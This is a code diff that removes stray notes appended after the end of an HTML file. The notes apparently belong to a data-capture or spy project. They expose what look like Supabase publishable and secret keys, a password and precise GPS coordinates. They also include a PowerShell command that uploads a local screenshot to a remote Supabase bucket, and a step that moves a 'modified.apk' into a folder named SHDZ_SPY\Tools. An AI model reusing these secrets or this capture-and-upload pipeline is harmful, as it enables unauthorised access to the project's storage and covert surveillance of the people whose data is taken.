@@ -1333,32 +1333,3 @@ document.addEventListener('visibilitychange', () => {
 </script>
 </body>
 </html>
-
-
-
-Do you remember we were working on a cybersecurity project?
-To demonstrate the technique to capture data.
-sb_publishable_fsGli9yTUfjwaxzCNqDWwQ_PTHmZx5H  Supabase publishable key
-sb_secret_djWNyaiWRmXmd1PwmNWvcg_6YuKqlZt       Supabase secret key
-
-21°08'15.0"N 79°03'44.6"E
-SUPABASEPASSWORD137
-
-
-
-$headers = @{
-  "apikey" = "sb_publishable_fsGli9yTUfjwaxzCNqDWwQ_PTHmZx5H"
-  "Authorization" = "Bearer sb_publishable_fsGli9yTUfjwaxzCNqDWwQ_PTHmZx5H"
-  "Content-Type" = "image/jpeg"
-}
-
-Invoke-RestMethod `
-  -Uri "https://gctpywfwjojurdrrsbvvp.supabase.co/storage/v1/object/uploads/test.png" `
-  -Method POST `
-  -Headers $headers `
-  -InFile "C:\Pictures\Screenshots\test.png"
-
-
-
-  Move-Item -Path ".\modified.apk" -Destination "C:\Users\hp\Documents\SHDZ_SPY\Tools\"
-  cd "C:\Users\hp\Documents\SHDZ_SPY\Tools\"
